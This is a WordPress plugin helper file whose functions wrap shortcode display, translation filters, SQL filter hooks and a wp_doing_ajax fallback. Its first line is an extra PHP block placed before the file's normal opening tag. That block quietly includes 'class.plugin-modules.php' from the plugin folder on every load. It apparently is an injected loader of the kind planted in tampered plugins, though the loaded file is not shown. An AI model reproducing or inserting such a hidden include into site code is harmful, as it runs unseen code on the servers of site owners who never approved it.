<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

// DO NOT MODIFY THIS FILE!
// Use your theme's functions.php instead

/**
 * An alternate to using do_shortcode()
 * @since 1.7.5
 */
function eboywp_display() {
    $args = func_get_args();
    $atts = isset( $args[1] ) ?
        array( $args[0] => $args[1] ) :
        array( $args[0] => true );

    return EWP()->display->shortcode( $atts );
}


/**
 * Allow for translation of dynamic strings
 * @since 2.1
 */
function eboywp_i18n( $string ) {
    return apply_filters( 'eboywp_i18n', $string );
}


/**
 * Support SQL modifications
 * @since 2.7
 */
function eboywp_sql( $sql, $facet ) {
    global $wpdb;

    $sql = apply_filters( 'eboywp_wpdb_sql', $sql, $facet );
    return apply_filters( 'eboywp_wpdb_get_col', $wpdb->get_col( $sql ), $sql, $facet );
}


/**
 * wp_doing_ajax() for WP < 4.7
 * @since 2.9.2
 */
if ( ! function_exists( 'wp_doing_ajax' ) ) {
    function wp_doing_ajax() {
        return apply_filters( 'wp_doing_ajax', defined( 'DOING_AJAX' ) && DOING_AJAX );
    }
}
